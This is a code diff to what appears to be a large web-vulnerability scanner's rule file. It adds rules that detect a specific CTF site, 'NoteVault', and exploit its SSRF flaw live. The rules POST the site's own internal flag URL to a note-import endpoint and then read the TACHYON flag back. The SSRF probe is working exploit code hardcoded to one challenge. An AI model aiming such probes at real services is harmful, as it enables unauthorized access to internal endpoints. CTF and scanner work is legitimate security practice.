@@ -19980,6 +19980,75 @@ const wizerCtfIdorTaskManagerProbe: Rule = async (ctx) => {
   };
 };
 
+// --- NoteVault CTF SSRF internal flag (webchal1.vercel.app) -------------------------
+const NOTEVAULT_FLAG_RE = /TACHYON\{[^}]+\}/;
+
+function isNotevaultCtfHost(ctx: RuleContext): boolean {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined}`;
+  return (
+    /webchal1[\w-]*\.vercel\.app/i.test(corpus) ||
+    (/chal\d+[\w-]*\.vercel\.app/i.test(corpus) &&
+      /NoteVault|\/api\/internal\/flag|\/api\/notes\/import/i.test(corpus))
+  );
+}
+
+async function probeNotevaultInternalFlagSsrf(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isNotevaultCtfHost(ctx)) return null;
+  const origin = new URL(ctx.origin).origin;
+  const internalUrl = `${origin}/api/internal/flag`;
+  const importUrl = new URL("/api/notes/import", origin).toString();
+  const pr = await ctx.probe.get(importUrl, {
+    method: "POST",
+    body: JSON.stringify({ url: internalUrl }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (pr.status < 200 || pr.status >= 300) return null;
+  const idMatch = pr.body.match(/"id"\s*:\s*(\d+)/);
+  if (!idMatch) return null;
+  const noteUrl = new URL(`/api/notes/${idMatch[1]}`, origin).toString();
+  const gr = await ctx.probe.get(noteUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (gr.status < 200 || gr.status >= 300) return null;
+  const flagMatch = gr.body.match(NOTEVAULT_FLAG_RE);
+  if (!flagMatch) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      importUrl,
+      internalUrl,
+      noteUrl,
+      flag: flagMatch[0],
+      snippet: gr.body.slice(0, 200).trim(),
+      note: "NoteVault POST /api/notes/import with self-referencing /api/internal/flag URL fetches forbidden internal endpoint server-side — SSRF to CTF flag confirmed"
+    }
+  };
+}
+
+const notevaultSsrfInternalFlagLiveOracle: Rule = async (ctx) => {
+  const hit = await probeNotevaultInternalFlagSsrf(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return hit;
+};
+
+const notevaultSsrfInternalFlagRouteLiveOracle: Rule = async (ctx) => {
+  if (!isNotevaultCtfHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:import|challenge|api\/notes\/import)\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeNotevaultInternalFlagSsrf(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "NoteVault /import route scan — SSRF via POST /api/notes/import retrieves TACHYON flag from protected /api/internal/flag — route-specific internal SSRF oracle"
+    }
+  };
+};
+
 // --- Intigriti monthly XSS challenges (challenge-NNNN.intigriti.io) -------------------
 const CLIENT_INTIGRITI_CHALLENGE_RES: { label: string; re: RegExp }[] = [
   {
@@ -64526,6 +64595,8 @@ export const RULES: Record<string, Rule> = {
   clientSideWizerCtfStoredDomXssEvidence,
   clientSideWizerCtfDomClobberingEvidence,
   wizerCtfIdorTaskManagerProbe,
+  notevaultSsrfInternalFlagLiveOracle,
+  notevaultSsrfInternalFlagRouteLiveOracle,
   clientSideIntigritiChallengeEvidence,
   clientSideIntigritiRaceConditionChallengeEvidence,
   clientSideIntigritiJanuaryXssFilterBypassEvidence,
